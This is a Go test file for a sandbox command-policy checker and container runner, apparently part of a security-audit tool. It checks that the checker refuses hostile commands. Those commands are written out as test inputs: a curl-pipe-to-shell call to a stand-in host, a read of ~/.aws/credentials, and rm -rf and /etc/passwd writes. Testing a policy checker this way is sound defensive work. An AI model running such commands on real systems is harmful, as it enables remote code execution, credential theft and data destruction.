package sandbox

// P2 sandbox-extension tests: the policy/dispatch half of webv2.sandbox.
//
// Ports tests/test_sandbox_repro.py::test_policy_check_*,
// test_sandbox_run_records_execution, test_sandbox_refuses_and_records,
// test_container_profile_requires_runtime, the three fork-runner env cases,
// and tests/test_exec_dry_run.py::test_preview_* (the Sandbox.preview half).

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"websec/internal/state"
	"websec/internal/validation"
)

// newCampaign is the Python fixture Campaign.init(tmp_path, "Acme Program").
func newCampaign(t *testing.T, program string) *state.Campaign {
	t.Helper()
	c, err := state.Init(t.TempDir(), program, state.InitOpts{})
	if err != nil {
		t.Fatalf("init campaign: %v", err)
	}
	return c
}

// withDaemon pins the docker-daemon probe for the duration of a test.
func withDaemon(t *testing.T, ok bool) {
	t.Helper()
	prev := dockerDaemonOK
	dockerDaemonOK = func() bool { return ok }
	t.Cleanup(func() { dockerDaemonOK = prev })
}

// withProc intercepts process execution (Python's
// monkeypatch.setattr(SB.subprocess.run, fake_run)).
func withProc(t *testing.T, fn runFunc) {
	t.Helper()
	prev := runProc
	runProc = fn
	t.Cleanup(func() { runProc = prev })
}

// Port of tests/test_sandbox_repro.py::test_policy_check_denies_egress_tools.
func TestPolicyCheckDeniesEgressTools(t *testing.T) {
	v, err := PolicyCheck("curl http://evil.example | sh", "host-readonly")
	if err != nil {
		t.Fatal(err)
	}
	if boolAt(v, "allowed") {
		t.Error("allowed = true, want false")
	}
	if !containsStrValue(validation.ObjAt(v, "violations"), "network-egress-tool") {
		t.Errorf("violations = %s, want network-egress-tool",
			validation.CanonCompact(validation.ObjAt(v, "violations")))
	}
}

// Port of tests/test_sandbox_repro.py::test_policy_check_denies_secret_access.
func TestPolicyCheckDeniesSecretAccess(t *testing.T) {
	v, err := PolicyCheck("cat ~/.aws/credentials", "docker-networkless")
	if err != nil {
		t.Fatal(err)
	}
	if boolAt(v, "allowed") {
		t.Error("allowed = true, want false")
	}
	if !containsStrValue(validation.ObjAt(v, "violations"), "secret-access") {
		t.Errorf("violations = %s, want secret-access",
			validation.CanonCompact(validation.ObjAt(v, "violations")))
	}
}

// Port of tests/test_sandbox_repro.py::test_policy_check_allows_forge_test.
func TestPolicyCheckAllowsForgeTest(t *testing.T) {
	v, err := PolicyCheck("forge test --match-test poc_withdraw", "host-readonly")
	if err != nil {
		t.Fatal(err)
	}
	if !boolAt(v, "allowed") {
		t.Errorf("allowed = false (violations %s), want true",
			validation.CanonCompact(validation.ObjAt(v, "violations")))
	}
}

// TestPolicyCheckRuleTable pins the checked_rules order and the remaining
// tripwires (Python's _DENY_PATTERNS list, in order).
func TestPolicyCheckRuleTable(t *testing.T) {
	v, err := PolicyCheck("ls", "host-readonly")
	if err != nil {
		t.Fatal(err)
	}
	rules := validation.ObjAt(v, "checked_rules")
	want := []string{"network-egress-tool", "privilege-escalation",
		"destructive-path", "secret-access", "external-publish", "system-write"}
	if len(rules.A) != len(want) {
		t.Fatalf("checked_rules = %s", validation.CanonCompact(rules))
	}
	for i, w := range want {
		if rules.A[i].S != w {
			t.Errorf("checked_rules[%d] = %q, want %q", i, rules.A[i].S, w)
		}
	}
	for _, tc := range []struct{ cmd, rule string }{
		{"sudo rm -rf /etc", "privilege-escalation"},
		{"rm -rf /var", "destructive-path"},
		{"git push origin main", "external-publish"},
		{"echo x > /etc/passwd", "system-write"},
		{"ssh host", "network-egress-tool"},
	} {
		v, err := PolicyCheck(tc.cmd, "host-readonly")
		if err != nil {
			t.Fatal(err)
		}
		if !containsStrValue(validation.ObjAt(v, "violations"), tc.rule) {
			t.Errorf("%q violations = %s, want %s", tc.cmd,
				validation.CanonCompact(validation.ObjAt(v, "violations")), tc.rule)
		}
	}
	// Python's `rm -rf /(?!tmp)` exempts /tmp.
	v2, err := PolicyCheck("rm -rf /tmp/x", "host-readonly")
	if err != nil {
		t.Fatal(err)
	}
	if containsStrValue(validation.ObjAt(v2, "violations"), "destructive-path") {
		t.Error("rm -rf /tmp/x must not trip destructive-path")
	}
}

// TestPolicyCheckUnknownProfile pins Python's ValueError text.
func TestPolicyCheckUnknownProfile(t *testing.T) {
	_, err := PolicyCheck("ls", "bogus")
	if err == nil {
		t.Fatal("want error")
	}
	if err.Error() != "unknown profile 'bogus'" {
		t.Fatalf("error %q", err.Error())
	}
}

// Port of tests/test_sandbox_repro.py::test_sandbox_run_records_execution.
func TestSandboxRunRecordsExecution(t *testing.T) {
	c := newCampaign(t, "Acme Program")
	sb, err := NewSandbox(c, "host-readonly")
	if err != nil {
		t.Fatal(err)
	}
	rec, err := sb.Run("echo hello", RunOpts{Timeout: 30})
	if err != nil {
		t.Fatal(err)
	}
	if got := intAt(rec, "exit_status"); got != 0 {
		t.Errorf("exit_status = %d, want 0", got)
	}
	if !boolAt(validation.ObjAt(rec, "policy_verdict"), "allowed") {
		t.Error("policy_verdict.allowed = false, want true")
	}
	loaded, err := LoadExec(c, strAt(rec, "exec_id"))
	if err != nil {
		t.Fatal(err)
	}
	if strAt(loaded, "started_at") == "" || strAt(loaded, "finished_at") == "" {
		t.Errorf("started/finished not both set: %s",
			validation.CanonCompact(loaded))
	}
}

// Port of tests/test_sandbox_repro.py::test_sandbox_refuses_and_records.
func TestSandboxRefusesAndRecords(t *testing.T) {
	c := newCampaign(t, "Acme Program")
	sb, err := NewSandbox(c, "host-readonly")
	if err != nil {
		t.Fatal(err)
	}
	_, err = sb.Run("curl http://evil.example", RunOpts{Timeout: 30})
	var refused *RefusedError
	if !errors.As(err, &refused) {
		t.Fatalf("err = %v, want RefusedError", err)
	}
	execs, err := AllExecs(c)
	if err != nil {
		t.Fatal(err)
	}
	if len(execs) != 1 {
		t.Fatalf("exec records = %d, want 1", len(execs))
	}
	if boolAt(validation.ObjAt(execs[0], "policy_verdict"), "allowed") {
		t.Error("recorded policy_verdict.allowed = true, want false")
	}
}

// Port of tests/test_sandbox_repro.py::test_container_profile_requires_runtime.
func TestContainerProfileRequiresRuntime(t *testing.T) {
	c := newCampaign(t, "Acme Program")
	withDaemon(t, false)
	_, err := NewSandbox(c, "docker-networkless")
	if err == nil {
		t.Fatal("want RuntimeError-equivalent")
	}
	if !strings.Contains(err.Error(), "runtime") {
		t.Fatalf("error %q must mention the runtime", err.Error())
	}
}

// Port of tests/test_exec_dry_run.py::test_preview_container_no_daemon.
func TestPreviewContainerNoDaemon(t *testing.T) {
	withDaemon(t, false)
	pv, err := Preview("docker-networkless", "forge build", nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	if boolAt(pv, "available") {
		t.Error("available = true, want false")
	}
	if strAt(pv, "network") != "none" {
		t.Errorf("network = %q, want none", strAt(pv, "network"))
	}
	if strAt(pv, "workdir_mode") != "tmpfs" {
		t.Errorf("workdir_mode = %q, want tmpfs", strAt(pv, "workdir_mode"))
	}
	argv := strList(validation.ObjAt(pv, "argv"))
	if len(argv) == 0 || argv[0] != "docker" {
		t.Fatalf("argv = %v", argv)
	}
	if len(argv) < 2 || argv[len(argv)-2] != "-c" ||
		argv[len(argv)-1] != "forge build" {
		t.Fatalf("argv tail = %v", argv)
	}
	if !strings.Contains(strAt(pv, "note"), "entrypoint") {
		t.Errorf("note = %q", strAt(pv, "note"))
	}
}

// Port of tests/test_exec_dry_run.py::test_preview_host_readonly_no_argv.
func TestPreviewHostReadonlyNoArgv(t *testing.T) {
	pv, err := Preview("host-readonly", "ls", nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, kv := range pv.O {
		if kv.K == "argv" {
			t.Fatal("host-readonly preview must not carry argv")
		}
	}
	if !strings.Contains(strAt(pv, "note"), "E4+") {
		t.Errorf("note = %q, want an E4+ warning", strAt(pv, "note"))
	}
}

// Port of tests/test_exec_dry_run.py::test_preview_fork_runner_env_default.
func TestPreviewForkRunnerEnvDefault(t *testing.T) {
	withDaemon(t, false)
	t.Setenv("FORK_RPC_URL", "")
	os.Unsetenv("FORK_RPC_URL")
	pv, err := Preview("fork-runner", "forge test", nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !containsStrValue(validation.ObjAt(pv, "env_keys"), "FORK_RPC_URL") {
		t.Errorf("env_keys = %s, want FORK_RPC_URL",
			validation.CanonCompact(validation.ObjAt(pv, "env_keys")))
	}
	found := false
	for _, a := range strList(validation.ObjAt(pv, "argv")) {
		if strings.Contains(a, "host.docker.internal") {
			found = true
		}
	}
	if !found {
		t.Errorf("argv = %v, want a host.docker.internal entry",
			strList(validation.ObjAt(pv, "argv")))
	}
}

// forkRunnerRun is tests/test_sandbox_repro.py::_fork_runner_run: the daemon
// check is stubbed and docker's subprocess.run intercepted, so the built
// container argv can be asserted on and no container is ever started.
func forkRunnerRun(t *testing.T, env []EnvVar) ([]string, validation.Value) {
	t.Helper()
	return containerRun(t, "fork-runner", env)
}

// containerRun is forkRunnerRun's profile-agnostic half — same stubs, any
// container profile.
func containerRun(t *testing.T, profile string, env []EnvVar) ([]string, validation.Value) {
	t.Helper()
	var captured []string
	withDaemon(t, true)
	withProc(t, func(argv []string, _ string, _ []string,
		_ time.Duration) (ProcResult, error) {
		captured = append([]string(nil), argv...)
		return ProcResult{ReturnCode: 0, Stdout: "ok"}, nil
	})
	c := newCampaign(t, "Acme Program")
	sb, err := NewSandbox(c, profile)
	if err != nil {
		t.Fatal(err)
	}
	rec, err := sb.Run("echo hi", RunOpts{Timeout: 30, Env: env})
	if err != nil {
		t.Fatal(err)
	}
	return captured, rec
}

// Port of test_sandbox_repro.py::test_fork_runner_inherits_operator_fork_rpc_url.
func TestForkRunnerInheritsOperatorForkRPCURL(t *testing.T) {
	t.Setenv("FORK_RPC_URL", "http://operator-fork:9545")
	argv, rec := forkRunnerRun(t, nil)
	if !containsStrValue(strValueArr(argv), "FORK_RPC_URL=http://operator-fork:9545") {
		t.Errorf("argv = %v, want the operator FORK_RPC_URL", argv)
	}
	if !containsStrValue(validation.ObjAt(validation.ObjAt(rec, "container"), "env_keys"), "FORK_RPC_URL") {
		t.Error("container.env_keys must name FORK_RPC_URL")
	}
}

// TestForkRunnerRewritesLoopbackRPC pins the rewrite itself: a loopback host
// is the CONTAINER's own loopback once inside the bridge sandbox, so it must
// become the host-gateway alias — everything else passes through untouched.
func TestForkRunnerRewritesLoopbackRPC(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"http://127.0.0.1:18545", "http://host.docker.internal:18545"},
		{"http://localhost:8545", "http://host.docker.internal:8545"},
		{"http://127.0.0.1:8545/path?x=1", "http://host.docker.internal:8545/path?x=1"},
		{"http://[::1]:8545", "http://host.docker.internal:8545"},
		{"https://127.0.0.1:8545", "https://host.docker.internal:8545"},
		// not loopback: untouched
		{"http://operator-fork:9545", "http://operator-fork:9545"},
		{"https://eth.drpc.org/xyz", "https://eth.drpc.org/xyz"},
		// idempotent: an already-rewritten value passes through unchanged
		{"http://host.docker.internal:18545",
			"http://host.docker.internal:18545"},
		// userinfo survives the rebuild; a host literal elsewhere in the
		// URL is never hit (no substring replace)
		{"http://user@127.0.0.1:8545", "http://user@host.docker.internal:8545"},
		// portless loopback keeps no port
		{"http://localhost", "http://host.docker.internal"},
		// scheme-less is a path, not an RPC URL: untouched
		{"127.0.0.1:8545", "127.0.0.1:8545"},
		// unparseable: untouched (the RPC will fail loudly, not silently)
		{"not a url", "not a url"},
	} {
		if got := ContainerForkURL(tc.in); got != tc.want {
			t.Errorf("ContainerForkURL(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// Port of test_sandbox_repro.py::test_fork_runner_default_without_operator_env.
func TestForkRunnerDefaultWithoutOperatorEnv(t *testing.T) {
	os.Unsetenv("FORK_RPC_URL")
	argv, rec := forkRunnerRun(t, nil)
	want := "FORK_RPC_URL=http://host.docker.internal:8545"
	if !containsStrValue(strValueArr(argv), want) {
		t.Errorf("argv = %v, want %s", argv, want)
	}
	if !containsStrValue(validation.ObjAt(validation.ObjAt(rec, "container"), "env_keys"), "FORK_RPC_URL") {
		t.Error("container.env_keys must name FORK_RPC_URL")
	}
}

// Port of test_sandbox_repro.py::test_fork_runner_explicit_env_beats_operator_env.
func TestForkRunnerExplicitEnvBeatsOperatorEnv(t *testing.T) {
	t.Setenv("FORK_RPC_URL", "http://operator-fork:9545")
	argv, rec := forkRunnerRun(t, []EnvVar{{Key: "FORK_RPC_URL",
		Value: "http://explicit:1"}})
	if !containsStrValue(strValueArr(argv), "FORK_RPC_URL=http://explicit:1") {
		t.Errorf("argv = %v, want the explicit value", argv)
	}
	if containsStrValue(strValueArr(argv), "FORK_RPC_URL=http://operator-fork:9545") {
		t.Errorf("argv = %v must not carry the operator value", argv)
	}
	if !containsStrValue(validation.ObjAt(validation.ObjAt(rec, "container"), "env_keys"), "FORK_RPC_URL") {
		t.Error("container.env_keys must name FORK_RPC_URL")
	}
}

// TestForkRunnerRewritesLoopbackOperatorEnvArgv is the argv half of the
// rewrite: the operator's host-loopback fork must reach the container as the
// host-gateway alias, never as 127.0.0.1.
func TestForkRunnerRewritesLoopbackOperatorEnvArgv(t *testing.T) {
	t.Setenv("FORK_RPC_URL", "http://127.0.0.1:18545")
	argv, _ := forkRunnerRun(t, nil)
	want := "FORK_RPC_URL=http://host.docker.internal:18545"
	if !containsStrValue(strValueArr(argv), want) {
		t.Errorf("argv = %v, want %s", argv, want)
	}
	for _, a := range argv {
		if strings.Contains(a, "127.0.0.1") {
			t.Errorf("argv = %v must not carry a loopback RPC", argv)
		}
	}
}

// TestForkRunnerRewritesExplicitLoopbackEnvArgv: an explicit caller env entry
// wins over the operator env (existing precedence) and is rewritten all the
// same.
func TestForkRunnerRewritesExplicitLoopbackEnvArgv(t *testing.T) {
	t.Setenv("FORK_RPC_URL", "http://operator-fork:9545")
	argv, _ := forkRunnerRun(t, []EnvVar{{Key: "FORK_RPC_URL",
		Value: "http://localhost:1234"}})
	want := "FORK_RPC_URL=http://host.docker.internal:1234"
	if !containsStrValue(strValueArr(argv), want) {
		t.Errorf("argv = %v, want %s", argv, want)
	}
}

// TestDockerNetworklessKeepsForkRPCVerbatim: --network none has no
// host-gateway, so the rewrite stays fork-runner's alone.
func TestDockerNetworklessKeepsForkRPCVerbatim(t *testing.T) {
	t.Setenv("FORK_RPC_URL", "http://operator-fork:9545")
	argv, _ := containerRun(t, "docker-networkless",
		[]EnvVar{{Key: "FORK_RPC_URL", Value: "http://127.0.0.1:18545"}})
	want := "FORK_RPC_URL=http://127.0.0.1:18545"
	if !containsStrValue(strValueArr(argv), want) {
		t.Errorf("argv = %v, want %s", argv, want)
	}
}

// TestRegisterExecAndAllExecs ports the register_exec ledger shape the
// reproduction tests depend on (conftest.sandboxed_exec).
func TestRegisterExecAndAllExecs(t *testing.T) {
	c := newCampaign(t, "Acme Program")
	rec, err := RegisterExec(c, RegisterOpts{
		Profile: "docker-networkless", Command: "forge test --match-test test_exploit",
		ReportedBy: "pytest-harness", StdoutText: "PASS: test_exploit\n"})
	if err != nil {
		t.Fatal(err)
	}
	if strAt(rec, "origin") != "externally-reported" {
		t.Errorf("origin = %q", strAt(rec, "origin"))
	}
	if strAt(rec, "reported_by") != "pytest-harness" {
		t.Errorf("reported_by = %q", strAt(rec, "reported_by"))
	}
	if intAt(rec, "exit_status") != 0 {
		t.Errorf("exit_status = %d", intAt(rec, "exit_status"))
	}
	if got := ExecOutput(rec); got != "PASS: test_exploit\n" {
		t.Errorf("exec output = %q", got)
	}
	if strAt(validation.ObjAt(rec, "environment"), "network_access") != "none" {
		t.Errorf("network_access = %q",
			strAt(validation.ObjAt(rec, "environment"), "network_access"))
	}
	execs, err := AllExecs(c)
	if err != nil {
		t.Fatal(err)
	}
	if len(execs) != 1 || strAt(execs[0], "exec_id") != strAt(rec, "exec_id") {
		t.Fatalf("all_execs = %s", validation.CanonCompact(validation.VArr(execs...)))
	}
	// the record is on disk in the schema-validated shape
	if _, err := os.Stat(filepath.Join(c.ExecsDir, strAt(rec, "exec_id"),
		"exec_record.json")); err != nil {
		t.Fatal(err)
	}
}

// TestRegisterExecValidation pins the two register_exec guards.
func TestRegisterExecValidation(t *testing.T) {
	c := newCampaign(t, "Acme Program")
	_, err := RegisterExec(c, RegisterOpts{Profile: "bogus", Command: "ls",
		ReportedBy: "harness"})
	if err == nil || err.Error() != "unknown profile 'bogus'" {
		t.Fatalf("err = %v", err)
	}
	_, err = RegisterExec(c, RegisterOpts{Profile: "host-readonly",
		Command: "ls"})
	if err == nil || !strings.Contains(err.Error(), "reported_by") {
		t.Fatalf("err = %v, want a reported_by requirement", err)
	}
}

// --- test-local value helpers ---------------------------------------------

func strValueArr(items []string) validation.Value {
	a := make([]validation.Value, 0, len(items))
	for _, s := range items {
		a = append(a, validation.VStr(s))
	}
	return validation.VArr(a...)
}

func containsStrValue(v validation.Value, want string) bool {
	for _, e := range v.A {
		if e.Kind == validation.Str && e.S == want {
			return true
		}
	}
	return false
}

func strList(v validation.Value) []string {
	out := make([]string, 0, len(v.A))
	for _, e := range v.A {
		if e.Kind == validation.Str {
			out = append(out, e.S)
		}
	}
	return out
}

func intAt(v validation.Value, key string) int64 {
	f := validation.ObjAt(v, key)
	if f.Kind == validation.Int {
		return f.I
	}
	return 0
}

// sandboxStderr reads an exec's captured stderr.
func sandboxStderr(t *testing.T, c *state.Campaign, rec validation.Value) string {
	t.Helper()
	raw, err := os.ReadFile(filepath.Join(c.ExecsDir, strAt(rec, "exec_id"),
		"stderr.log"))
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}

// TestSandboxRunStartFailureIsNotSuccess pins the 2026-09-10 fix: when the
// process never started, execute() returned res.ReturnCode — the zero value —
// so a missing workdir or a missing runtime was recorded as exit_status 0,
// i.e. a successful execution of a command that never ran.
func TestSandboxRunStartFailureIsNotSuccess(t *testing.T) {
	c := newCampaign(t, "Acme Program")
	sb, err := NewSandbox(c, "host-readonly")
	if err != nil {
		t.Fatal(err)
	}
	missing := filepath.Join(t.TempDir(), "gone")
	rec, err := sb.Run("echo hello", RunOpts{Timeout: 30, Workdir: &missing})
	if err != nil {
		t.Fatal(err)
	}
	if got := intAt(rec, "exit_status"); got != -1 {
		t.Errorf("exit_status = %d, want -1 (the process never started)", got)
	}
	if stderr := sandboxStderr(t, c, rec); !strings.Contains(
		stderr, "sandbox: ") {
		t.Errorf("stderr = %q, want the start-failure reason", stderr)
	}
}

// TestSandboxRunExecErrorIsNotSuccess is the same contract for a runner-level
// failure with no process at all (Python's OSError out of subprocess.run).
func TestSandboxRunExecErrorIsNotSuccess(t *testing.T) {
	withProc(t, func(argv []string, dir string, env []string,
		timeout time.Duration) (ProcResult, error) {
		return ProcResult{}, errors.New("exec: \"docker\": executable file " +
			"not found in $PATH")
	})
	c := newCampaign(t, "Acme Program")
	sb, err := NewSandbox(c, "host-readonly")
	if err != nil {
		t.Fatal(err)
	}
	rec, err := sb.Run("echo hello", RunOpts{Timeout: 30})
	if err != nil {
		t.Fatal(err)
	}
	if got := intAt(rec, "exit_status"); got != -1 {
		t.Errorf("exit_status = %d, want -1", got)
	}
	if stderr := sandboxStderr(t, c, rec); !strings.Contains(stderr,
		"executable file not found") {
		t.Errorf("stderr = %q, want the exec error", stderr)
	}
}
